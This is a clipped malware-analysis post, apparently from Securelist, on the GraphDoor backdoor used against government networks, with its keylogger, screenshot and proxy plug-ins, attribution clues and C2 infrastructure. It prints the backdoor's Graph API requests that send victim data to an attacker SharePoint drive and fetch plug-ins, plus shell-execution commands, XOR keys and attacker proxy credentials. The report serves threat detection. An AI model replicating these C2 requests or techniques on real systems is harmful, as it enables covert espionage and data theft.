---
title: "Operation ShadowCloud: cloud service–based backdoors targeting government networks in Asia and Africa. Part 2"
source: https://securelist.com/operation-shadowcloud-graphdoor/122005/
source_host: securelist.com
clip_date: 2026-11-19T09:12:15+08:00
trace_id: 58869e68-3f84-40a3-8750-b626dfa9e2f0
content_hash: b4cdf34e6c36b9474efa059927b32499f06fbed960ff202d9e4200c8339fe9c3
status: synced
tags: []
series: "Operation ShadowCloud: cloud service–based backdoors targeting government networks in Asia and Africa."
feed_source: Kaspersky Securelist
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41d75244-d011-8149-b502-dbc44627da81
ioc:
  cves: []
  cwes: []
  hashes:
    - 14ec33ea808e697870d00c5e434c2952
    - 32151547d912488ac5242731057170a3
    - 45b3aa39bc33528650d9181cd946b2df
    - 733f8002aa9531b25384c0014d15cc1f
    - 86a46af43e18288e1df439b2a9a6f7ca
    - 91bee19d31d32346cd4d1febb4308606
    - 9a5e0ab7466594dcf46943c413db7b81
    - b4956b230d296cb4b015b42b11d80e32
    - d89b2fe0759df2d534e7a728700a6f8c
    - e9d4081fac4a5111e6856f333d490439
  domains:
    - buildersemp.sharepoint.com
    - ms.twnic.top
    - twnic.top
  tools: []
  techniques: []
---

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5ed5334cc75b1452.jpg)

## Introduction

The first part of the blog focused on the initial infection chain, examined the GitDoor backdoor’s command‑and‑control protocol, and cataloged the diverse shellcode families the actors drop onto compromised hosts. In this part, we will walk through the GraphDoor backdoor and the suite of plug-ins loaded, including patched Erfrp and Ably proxy plug-ins, and highlight the attribution clues that tie the operation to Chinese‑speaking threat groups.

## GraphDoor (MD5 14ec33ea808e697870d00c5e434c2952)

The malware begins by opening a named pipe that it will reuse for later communications, building the pipe’s name from its own PID in the form `\\.\pipe\p%lu` (where %lu is the process ID as an unsigned long integer). Once the backdoor contacts its C2 server and downloads the required plug-ins, those plug-ins write their status reports to the same pipe.

After the pipe is set up, the backdoor creates a directory named `Intel_Log` inside the system’s ProgramData folder. Inside that folder, it generates a subdirectory whose name is a randomly generated GUID, yielding a full path like `C:\ProgramData\Intel_Log\<random‑GUID>`.

Next, the malware starts gathering system information to send back to the attacker. It resolves the needed Windows APIs at runtime by hashing DLL and function names with the DJB2 algorithm. To invoke these APIs covertly, the backdoor installs a vectored exception handler that contains a miniature routine for the desired call, then deliberately raises an exception. The handler catches the exception, runs the routine, and thus calls the target API. Using this indirect call technique, the malware harvests the following information from the victim machine:

-   Network adapter details
-   Version of the operating system
-   A randomly generated GUID for the infected machine
-   Public IP
-   Private IP
-   Username
-   Host name
-   Current directory (where the backdoor is executed from)
-   PID of its own module
-   A list of all the running processes

In addition to the victim information, the backdoor also decrypts a set of embedded configuration parameters (see the list below) and appends them to the victim data. The resulting information is then encrypted with AES, Base64‑encoded, and transmitted to the command‑and‑control server.

-   `"type":"serv"`
-   `"client_version":"1.2.7"`
-   `"dhj_exe":"javaw.exe"`
-   `"execution_method":"normal"`
-   `"is_need_lock":"false"`

The malware first opens a TLS connection to `login.microsoftonline.com` on port 443. Once the TLS handshake completes, it decrypts three hard‑coded, AES-encrypted strings. These values become the components of the authentication request:

-   UUID path segment
-   Client ID (application registration)
-   Client secret

It also generates a random X‑CSRF‑TOKEN, decrypts a preset User‑Agent string and several other hard-coded strings, and then issues a POST request to `login.microsoftonline.com` (see the example below). This call authenticates the malicious application – not a user – and returns an access token that the backdoor later uses to communicate with the Microsoft Graph API.

```
POST /8f50c589-a4d6-4df4-95bb-2fb7f5983fe5/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36
X-CSRF-TOKEN: %Randomly generated value%
Content-Length: %size of the data%
Content-Type: application/x-www-form-urlencoded
Connection: close
"client_id=<redacted>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials&client_secret=<redacted>"
```

If the authentication succeeds and an access token is obtained, the backdoor generates a fresh random value for the X‑CSRF‑TOKEN header and then connects to `graph.microsoft.com`. It issues a Microsoft Graph PUT request that creates a file called `main.%victim‑unique‑code%.js.map`, masquerading as a JavaScript source map file, in a SharePoint document library. The placeholder `%victim_unique_code%` is a randomly generated eight‑character alphanumeric string. The encrypted victim data placed in the PUT request body is stored in this file on the SharePoint drive.

```bash
PUT /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/drives/b!6T_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L_sSp8lOvFe6wi_/root:/main.%victim_unique_code%.js.map:/content HTTP/1.1
Host: graph.microsoft.com
Authorization: %Access token received from the previous step%
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36
X-CSRF-TOKEN: %randomly generated string%
Content-Length: %size of the data to be uploaded%
Content-Type: application/json
Connection: close

{"message":"commit from INSOMNIA","content":"%base64-encoded encrypted victim information%"}
```

The path of the PUT request above is broken down as follows:

-   **/sites/**: accesses SharePoint sites
-   **sharepoint\[.\]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab**: site identifier
    -   **buildersemp.sharepoint\[.\]com**: the SharePoint domain/website
-   **/drives/**: accesses document libraries (drives) within the site
-   **b!6T_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L_sSp8lOvFe6wi\_**: drive ID
-   **root:/main.%victim_unique_code%.js.map:/content**: uploads a file to the root folder with a dynamic filename

The malware then pulls three plug-in modules from the server. The table below lists the corresponding filenames stored on SharePoint.

```
scr.ts: screenshot capturing
pr.ts: process listing
kl.ts: keylogger
```

For each plug-in, the malware launches a separate thread, allowing the downloads to proceed in parallel without blocking one another. Once fetched, the plug-ins are decrypted using the same routine employed by the GitDoor variant.

In order to download the screenshot capturing plug-in, the backdoor creates the following HTTP GET request:

```bash
GET /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'scr.ts') HTTP/1.1
Host: graph.microsoft.com
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36
X-CSRF-TOKEN: %random string%
Content-Type: application/json
Connection: close
```

For the keylogger plug-in, the backdoor first checks for the existence of the file `C:\Users\analyst\AppData\Roaming\log.lock`. It downloads the plug-in only if this file is present, using the following GET request:

```bash
GET /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'kl.ts') HTTP/1.1
Host: graph.microsoft.com
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36
X-CSRF-TOKEN: %random string%
Content-Type: application/json
Connection: close
```

The request to download plug-ins targets a specific list on a specific SharePoint site via the Microsoft Graph API v1.0 endpoint. It includes several parameters that filter and shape the response, as shown below:

-   **buildersemp.sharepoint\[.\]com**: SharePoint website
-   **dd27e665-bef6-4de1-b28f-280c0af4593f**: list ID
-   **$select=id,fields**: only return the id field and the fields object
-   **select=Title,text,Modified,Created)**: expand the fields object to include specific columns: Title, text, Modified, and Created
-   **$filter=startswith(fields/Title,’kl.ts’)**: filter the results where the Title field starts with `"ts"`, `"scr.ts"`, or `"pr.ts"`

Once the three plug-in modules have been retrieved, the malware reestablishes contact with the server to fetch commands. It then sends a request (as shown below) to list the command files intended for the victim on the SharePoint website.

```bash
GET /v1.0/sites/buildersemp.sharepoint[.]com,7700c47b-4999-4cc6-acc5-9a3c7559c34b,66f393a9-0c1a-4d9a-aa2f-27d7293a642d/lists/8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8/items?select=id,fields&expand=fields(select=Title,Modified,Created)&filter=startswith(fields/Title,'main.%unique_victim_code%') HTTP/1.1
Connection: Keep-Alive
Content-Type: application/json
Accept: application/json
Authorization: %token%
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36
X-CSRF-TOKEN: OpB9ZzK4rlfyCGO72mEgBqROv7jr5pUVZ
Host: graph.microsoft.com
```

The above request retrieves items from a SharePoint list. It selects files whose Title begins with `main.%unique_victim_code%` – that is, command files intended for the victim identified by `%unique_victim_code%`.

-   **/lists/**: addressing a list inside the site
-   **8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8**: the GUID of the list to be queried
-   **/items**: the collection of list items (rows) inside that list
-   **$select=id,fields**: return only the id and fields properties of each item
-   **select=Title,Modified,Created)**: expand the fields navigation property so that its selected sub‑properties are listed in the response. Get only three columns: Title, Modified, and Created
-   **$filter=startswith(fields/Title,’main.%unique_victim_code%’)**: keep only those list items whose Title column starts with the literal text %unique_victim_code%

The response to the above request is a JSON array of command files, as shown below. The backdoor verifies each file’s extension against an allowed list (`.js`, `.swp`, `.tmp`, `.kmap`, `.pmap`, `.apmap`). When a match is found, it downloads the corresponding command file and executes the command in the same way as described for the GitDoor variant.

```swift
"value": [
        {
            "@odata.etag": "\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\"",
            "id": "2145",
            "fields@odata.context": "https://graph.microsoft.com/v1.0/$metadata#sites('buildersemp.sharepoint.com%2Cea78ecdb-13c6-471d-977e-9472d8eb3a1c%2C0c4a2edf-cfc5-468e-91f1-4845efbededf')/lists('d23978b8-cb90-4e0b-bcbd-c9347ae1bedb')/items('2145')/fields(Title,Modified,Created)/$entity",
            "fields": {
                "@odata.etag": "\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\"",
                "Title": "main.4rSKjLE7.sn35.js",
                "Modified": "2026-09-01T09:02:11Z",
                "Created": "2026-09-01T09:02:11Z"
            }
        },...
]
```

The backdoor incorporates commands similar to those found in the GitDoor variant. However, in the `"Load Shellcode"` category, we identified two additional commands: `shell` and `adsmload`.

<div class="joplin-table-wrapper"><table><tbody><tr><td><strong>Command type</strong></td><td><strong>Additional supported commands</strong></td></tr><tr><td>Load Shellcode</td><td><ul><li><code>shell</code>: execute the supplied command with <code>cmd.exe /C &lt;command_string&gt;</code></li><li><code>adsmload</code>: this command is very similar to the <code>smload</code> command, however, the payload and optional input arguments are formatted as ASCII MAC addresses and then Base64-encoded.<br>After decoding the Base64 string, the ASCII MAC address-encoded strings are parsed back into raw binary bytes using <code>RtlEthernetStringToAddressA</code>.<br>The final payload bytes may be an MZ executable or shellcode (consisting of a stub and executable code), which are injected into memory. The payload arguments are also Base64‑decoded, ASCII MAC address-decoded, and written to the shared‑memory segment named <code>Local\sm&lt;%current_process_id%&gt;</code>.</li></ul></td></tr></tbody></table></div>

## Plug-ins

A plug-in is composed of a small loader stub followed by a COFF (Common Object File Format) object. The loader stub searches the binary for the marker byte sequence `\x1C\x3F\xE6\xE9`; everything that appears after this marker is the actual COFF payload. This payload holds only the core elements needed for execution: the section count, section headers, the raw section code, and any symbol information.

The stub allocates executable memory, copies the section code into that buffer, and performs the required relocations. Finally, the stub finds the entry-point function named **go** inside the COFF object and calls it to run the plug-in.

### Keylogger (kl.ts)

The keylogger writes its data to a file located at `%APPDATA%\Microsoft\SystemCertificates\Cache\logs.dat`. When started, it first creates a random 32‑byte XOR key. This key is used to encrypt the raw keystroke data before the data is appended to logs.dat. The random XOR key does not remain in clear text. It is itself XOR‑masked with a hard‑coded 32‑byte key (DE DD 8C AC 75 45 93 38 34 B3 17 5B BF C5 37 5D DD 09 52 F7 A7 9F F3 47 1D 55 A6 14 0E BA 05 E5). The resulting encrypted key bytes are written to the log file, followed by a single‑byte checksum that is the sum of those bytes reduced to one byte. After the encrypted key, a fixed 32‑byte marker (53 4D C2 A1 3F 95 26 B7 2C 54 86 9A 02 87 A9 08 70 4B 5D B9 75 DD 8B 03 4B 0A 2B 89 25 CC E7 B1) is added to signal the beginning of the keylogger’s data. If the plug-in is launched again and the log file already exists, the same marker sequence is simply prepended again before any new XOR‑encrypted keystrokes are stored. The keylogger then sets up low‑level keyboard and mouse hooks. When both hooks are successfully installed, it outputs: `bof-keylogger###keyLog start success`, mouseLog start success to the console. Additionally, the malware creates a named object called `keylogger###Global\OneDriveStandaloneUpdater{%X-%X}`. When this object receives a signal, a routine is triggered that flips a flag to cease logging and prints: `bof-keylogger###stop`. The recorded keystrokes are finally written to logs.dat using the XOR-encrypted format described above.

```sql
"W:[%s (%04u-%02u-%02u %02u:%02u:%02u)],<virtual key code>,<mouse coordinates>"
%s: window text (e.g., window title)
%04u-%02u-%02u %02u:%02u:%02u: UTC timestamp in the form YYYY-MM-DD HH:MM:SS
Virtual key code represented as %lu (an unsigned long integer)
Mouse coordinates formatted as %s%ld_%ld, where %s is the mouse‑event code and %ld are the x and y positions. Mouse events can be MLD (Mouse Left Button Down), MLU (Mouse Left Button Up), MRD (Mouse Right Button Down), MRU (Mouse Right Button Up), MMD (Mouse Middle Button Down), MMU (Mouse Middle Button Up), and MWH (Mouse Wheel Scroll Event).

Example
W:[Search (2026-07-10 09:03:40)],91,91+82,W:[Run (2026-07-10 09:03:43)],MLD945_1049,MLU945_1049
```

### Process Listing (pr.ts)

The plug-in gathers information about the processes running on the system. It first acquires the SeDebugPrivilege privilege and then enumerates every active process. Each process is recorded in the following format:

```bash
bof-process###%d###%d###%s###%s###%d###%s\%s###
%d: process ID
%d: parent process ID
%s: process executable name
%s: x64 or x86 process
%d: session ID under which the specified process is running
%s\%s: DomainName\UserAccountName

Example
bof-process###484###2804###msedge.exe###x64###1###n00b-PC\n00b###
```

After gathering information about the running processes, the plug-in connects to the existing pipe named `\\.\pipe\p%lu` (where `%lu` represents the backdoor’s process ID as an unsigned long integer), which is created by the backdoor. Upon a successful connection, it writes the collected process information to the pipe.

### Screenshot Capturing (scr.ts)

The plug-in scans every top‑level window displayed on the screen and checks each window’s owning process ID against the supplied process ID. When it finds a window whose process ID matches and the window is visible, it takes a snapshot of that window. The image is then encoded as a JPEG, transformed into a Base64 string, prefixed with the marker `bof-screenshot###`, and sent through the existing named pipe `\\.\pipe\p%lu` (where `%lu` is the backdoor’s own process ID). If the supplied process ID is zero, the code captures a screenshot of the whole desktop instead.

### Move Directory (moveDir.ts)

The plug-in moves the legitimate executable, the malicious loader DLL, and the encrypted backdoor file (config.ini) to a specified target path. It first compares the provided target file path with the current backdoor file path. If the two paths differ, it creates the target directory (if it does not already exist). It then copies the legitimate executable to the target path. Afterward, the plug-in iterates over a predefined list of loader DLL names, as shown below.

```
python311.dll, SbieDll.dll, jli.dll, libcef.dll, krita.dll, nvdaHelperRemote.dll, AppVIsvSubsystems64.dll, winmm.dll, CoreFoundation.dll, vcruntime140.dll, msvcp140.dll, snmpapi.dll, MSIMG32.dll, version.dll, sqlite.dll, msedge_elf.dll, python39.dll, python38.dll, python33.dll
```

The plug-in copies each loader DLL that is present at the current backdoor path to the target path. Finally, the encrypted backdoor file (config.ini) is also copied from the current path to the target path. After the legitimate executable, loader DLL, and encrypted payload file are successfully copied to the target path, the legitimate executable is launched from the target path. If the process creation succeeds, the plug-in creates an exit event named `Global\ExitEvent` and waits for the event to be signaled or triggered. When the event is signaled, the plug-in sleeps for eight seconds and then terminates the current backdoor process (i.e., the old instance).

If the target path matches the current path, the plug-in enumerates all running processes and retrieves the executable name of the backdoor’s parent process. When the backdoor name and its parent process’s name are identical, it triggers the `Global\ExitEvent` event. It then pauses for seven seconds, terminates the parent process, and, after an additional one‑second pause, checks the delete‑files flag. If the flag is set, it deletes the parent process’s executable, the encrypted backdoor file (config.ini), and the loader DLL from the parent process’s path.

### Proxy Channel (channel.ts)

The plug-in consists of bootstrap code, unlike the stub code used in other plug-ins, and a compiled Go executable instead of an object file. The bootstrap code injects the Go binary into the current process’s address space via reflective loading, working much like the Type 1 loader jli.dll (MD5: e9d4081fac4a5111e6856f333d490439).  
The injected Go program (MD5: d89b2fe0759df2d534e7a728700a6f8c) acts as a proxy client and is derived from the open‑source reverse‑proxy project Erfrp. Inside the binary, you can find a path string that hints at the attacker’s development environment and intent: `C:/Users/user/Desktop/pythonrat/proxytest/Erfrp-0.1/frpc.go`. The original Erfrp source has been tweaked so that it no longer reads a configuration file; instead, it pulls its settings from a shared‑memory segment named `Local\pc<current‑process‑ID>`. The client converts the contents of this segment to a string and interprets it as follows:

-   If the string is `True`, `False`, or `connecting`, the client writes False back to the shared memory, sleeps for two seconds, and then checks the memory again.
-   If the string contains a full proxy‑client configuration, the client parses those parameters and launches a fast reverse‑proxy session using the extracted configuration.

### Ably Channel (abchannel.ts)

The plug-in consists of bootstrap code and a compiled Go executable. The bootstrap code reflectively injects the Go executable into the memory of the current process, functioning similarly to the Type 1 loader jli.dll (MD5: e9d4081fac4a5111e6856f333d490439).

The injected Go program (MD5: b4956b230d296cb4b015b42b11d80e32) carries a hard‑coded project path: `C:/Users/user/Desktop/armon/server.go`, which likely points to the attacker’s development environment. Once in memory, the binary acts as a client for Ably’s real‑time messaging service, using the official Go SDK. It performs the following steps to connect to the Ably messaging service.

1.  **Read configuration:** the client reads the first 4096 bytes from the named shared‑memory segment `Local\pcs<%PID%>` (where `%PID%` is the current process ID). The raw bytes are turned into a UTF‑8 string.
2.  **Token and channel name extraction:** if that string contains the keyword “Token”, it is parsed as JSON to pull out two fields:
    -   Ably JWT token: used for authentication
    -   Channel name: the Ably channel that will be used for communication
3.  **Connection setup:** a client ID of the form `cli‑<%PID%>` is built, the JWT token is supplied, and a secure real‑time connection to Ably is opened. The program then subscribes to two events on the chosen channel: `json` and `json.send`.
4.  **Ready signal:** after a successful subscription, the plug-in writes the string `"True"` back into the shared‑memory segment and logs a silent `"File proxy server started…"` message.
5.  **Polling loop:** every second, the plug-in rereads the shared‑memory segment. If the value becomes `"False"`, the Ably connection is gracefully torn down.

**Message handling**

|     |     |
| --- | --- |
| **Event** | **What the client does** |
| json | The message is split on the delimiter `###!!###`. The first part must be the literal string json; the second part is a Base64‑encoded hostname. The client decodes the hostname, opens a TCP socket to it, and reads up to 45 KB of data from the socket.  <br>The data is Base64‑encoded and wrapped as `<event>.resp.<RANDOM>.###!!###<base64>`, where `<event>` is the original token (json) and `<RANDOM>` is a random integer between 0 and 10,000. This new message (json.resp) is then published back to the same Ably channel. |
| json.send | The message is also split on `###!!###`. The second part is Base64‑encoded data. After decoding, the payload is written to the same TCP socket that was opened for the json request. The client continues writing until it receives the special marker `###EOF###`. |

### Ably2 Channel (ab2channel.ts)

The plug-in is a covert SOCKS5 proxy that tunnels arbitrary TCP traffic through Ably’s Pusher‑compatible WebSocket service. The plug-in is a compiled Windows executable, and its execution starts at the “MZ” bytes, which serve as trampoline code that redirects control to the bootstrap code. The functionality of the bootstrap code is similar to that used in the Type 1 loader `jli.dll (MD5: 32151547d912488ac5242731057170a3)`. The plug-in requires three configuration parameters: Ably  `APP_KEY`, `APP_SECRET`, and `instance_id`. Armed with those values, it opens a secure WebSocket connection to Ably’s Pusher‑compatible endpoint:

```
wss://main.pusher.ably.net/app/<APP_KEY>?protocol=7&client=cpp-socks5
Use Pusher Channels protocol version 7
The connecting application identifies itself as cpp-socks5.
```

The plug-in uses two private channels for request and response, which are derived from the instance_id.

-   Request channel: `private-socks5-<instance_id>-request`
-   Response channel: `private-socks5-<instance_id>-response`

The client signs every request with the `APP_SECRET` to prove its identity and subscribes to the request channel. It waits for three possible message types:

|     |     |     |
| --- | --- | --- |
| **Message name** | **Expected payload** | **Action taken** |
| socks5:connect | { “session_id”: n, “host”: “…”, “port”: … } | Opens a new TCP socket to the supplied host/port, creates a session identified by session_id, and starts reading data from that socket.  <br>The data read from the remote TCP socket is split into 0x8400‑byte (33,792 bytes) blocks. Each block is Base64‑encoded, wrapped in a JSON object, and published back to the response channel. |
| socks5:data | { “session_id”: n, “payload”: “<base64>” } | Decodes the Base64 payload and writes the resulting bytes into the previously opened socket for the matching session. |
| socks5:close | { “session_id”: n } | Gracefully shuts down the socket for that session and frees associated resources. |

## Attribution

Currently, we lack sufficient information to definitively attribute this activity to a specific threat group. However, we observed overlaps with activity from Chinese-speaking groups such as FamousSparrow and CopperTurtle (detailed reports on these groups are available to customers of our private reporting service). On several victim systems, these groups shared the same staging directories as the GitDoor backdoor, with their implants deployed within a one-day window of GitDoor deployment. While this does not prove a direct link, it suggests that a Chinese-speaking group may be developing and/or utilizing the GitDoor and GraphDoor backdoors.

In the case of the FamousSparrow campaign, the attacker executed excint.exe (MD5: 86a46af43e18288e1df439b2a9a6f7ca), which is a renamed component of Avast Antivirus (located in `%ProgramData%\excint\`). This program side-loaded the malicious DLL `%ProgramData%\excint\wtsapi32.dll (MD5: 733f8002aa9531b25384c0014d15cc1f)`. The malicious wtsapi32.dll reads an encrypted payload from a file whose name matches the legitimate executable’s filename (excint), located in the same directory. The payload is RC4-decrypted using the hard-coded key `iotrh^%4CFGTj`, which was previously identified as being used by the [FamousSparrow](https://www.welivesecurity.com/en/eset-research/you-will-always-remember-this-as-the-day-you-finally-caught-famoussparrow/) APT.

|     |     |     |
| --- | --- | --- |
| **Threat actor** | **Staging directory** | **Creation date** |
| FamousSparrow | %ProgramData%\\excint\\excint.exe  <br>%ProgramData%\\excint\\wtsapi32.dll (MD5: 733f8002aa9531b25384c0014d15cc1f) | 2026.03.06 |
| GitDoor backdoor | %ProgramData%\\excInt\\sg\\zoomit.exe  <br>%ProgramData%\\excint\\sg\\WINMM.dll (MD5: 91bee19d31d32346cd4d1febb4308606) | 2026.03.05 |

In the CopperTurtle case, the attacker launched the malicious executable C:\\Program Files\\PDF24\\pdfset.exe (MD5: 45b3aa39bc33528650d9181cd946b2df), which injects the PLEAD RAT into memory.

|     |     |     |
| --- | --- | --- |
| **Threat actor** | **Staging directory** | **Creation date** |
| CopperTurtle | C:\\Program Files\\PDF24\\pdfset.exe (MD5: 45b3aa39bc33528650d9181cd946b2df) | 2026.05.03 |
| GitDoor backdoor | C:\\Program Files\\PDF24\\pdf.exe  <br>C:\\Program Files\\pdf24\\SbieDll.dll (MD5: 9a5e0ab7466594dcf46943c413db7b81) | 2026.05.04 |

## Infrastructure

The backdoor does not embed a hard-coded C2 domain. Instead, it retrieves the C2 hostname and port via the info command of the proxy channel plug-in or via an Ably messaging channel, preventing direct capture of C2 domain information. The IP addresses `103[.]106[.]230[.]33` and `123[.]58[.]205[.]105` resolve to the domains `ms[.]twnic[.]top` and `ekmt[.]tw`, respectively. Both domains (`twnic[.]top`, `ekmt[.]tw`) were also used as Cobalt Strike beacon C2 servers. The beacon samples were deployed on victim machines infected with the GraphDoor backdoor.

|     |     |     |     |     |
| --- | --- | --- | --- | --- |
| **Proxy server address** | **Proxy username** | **Proxy password** | **Domain** | **ASN** |
| 104\[.\]194\[.\]154\[.\]28 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 216\[.\]73\[.\]158\[.\]72 | NA  | NA  | NA  | AS 53724 (EXTRAVM LLC) |
| 122\[.\]147\[.\]252\[.\]16 | NA  | NA  | NA  | AS 9919 (New Century InfoComm Tech Co., Ltd.) |
| 103\[.\]106\[.\]230\[.\]33 | google | 1qaz2wsx-pl | ms\[.\]twnic\[.\]top | AS 136258 (BrainStorm Network, Inc) |
| 123\[.\]58\[.\]205\[.\]105 | google | 1qaz2wsx-pl | ekmt\[.\]tw | AS 135377 (UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED) |
| 223\[.\]165\[.\]4\[.\]203 | admin123 | 1qaz@WSX!@# | NA  | AS 136258 (BrainStorm Network, Inc) |
| 172\[.\]86\[.\]66\[.\]19 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 103\[.\]214\[.\]68\[.\]20 | aaa | zzljq6Qj | NA  | AS 53724 (EXTRAVM LLC) |
| 216\[.\]146\[.\]25\[.\]173 | NA  | NA  | NA  | AS 63018 (Dedicated.com) |
| 103\[.\]137\[.\]63\[.\]39 | xyz | abc | NA  | AS 131642 (Pittqiao Network Information Co., Ltd.) |
| 103\[.\]227\[.\]224\[.\]189 | whatfuck | BQdTQYer123123 | NA  | AS 148996 (GLOBAL COMMUNICATION NETWORK LIMITED) |
| 104\[.\]194\[.\]152\[.\]173 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 66\[.\]42\[.\]52\[.\]137 | abc  <br>user | abc  <br>IKtxbUi7 | NA  | AS 20473 (The Constant Company, LLC) |
| 153\[.\]75\[.\]94\[.\]148 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 45\[.\]59\[.\]124\[.\]164 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 104\[.\]194\[.\]153\[.\]161 | abc  <br>abc | abc  <br>rrVa8mhb | NA  | AS 14956 (RouterHosting LLC) |
| 153\[.\]75\[.\]95\[.\]27 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 216\[.\]73\[.\]158\[.\]117 | abc | abc | NA  | AS 53724 (EXTRAVM LLC) |
| 154\[.\]205\[.\]154\[.\]209 | NA  | NA  | NA  | AS 154177 (LIGHT NODE LIMITED) |
| 43\[.\]134\[.\]62\[.\]111 | NA  | NA  | NA  | AS 132203 (Tencent Building, Kejizhongyi Avenue) |
| 38\[.\]54\[.\]17\[.\]113 | NA  | NA  | NA  | AS 154177 (LIGHT NODE LIMITED) |
| 38\[.\]52\[.\]17\[.\]113 | NA  | NA  | NA  | AS 33152 (Kit Carson Electric Cooperative, Inc) |

## Conclusion

The discovery of Operation ShadowCloud reveals a sophisticated, modular threat infrastructure leveraging legitimate cloud platforms – Microsoft SharePoint, GitHub, and Ably – as stealthy C2 channels. By using cloud-based storage and messaging services, the actors blend in with normal traffic (as cloud API calls to Microsoft Graph, GitHub, and Ably are indistinguishable from legitimate enterprise usage, evading many network-based detections), and enable dynamic payload delivery, where on-demand plug-ins and shellcode are retrieved from cloud repositories, allowing for rapid updates and functional extensions without modifying host files. While it’s unclear at the time of writing this report how the threat actors initially dropped the MeshCentral Agent, introducing such legitimate tools to an environment should be treated as a suspicious event; although such tools have legitimate uses, they have already been abused by different threat actor types globally.
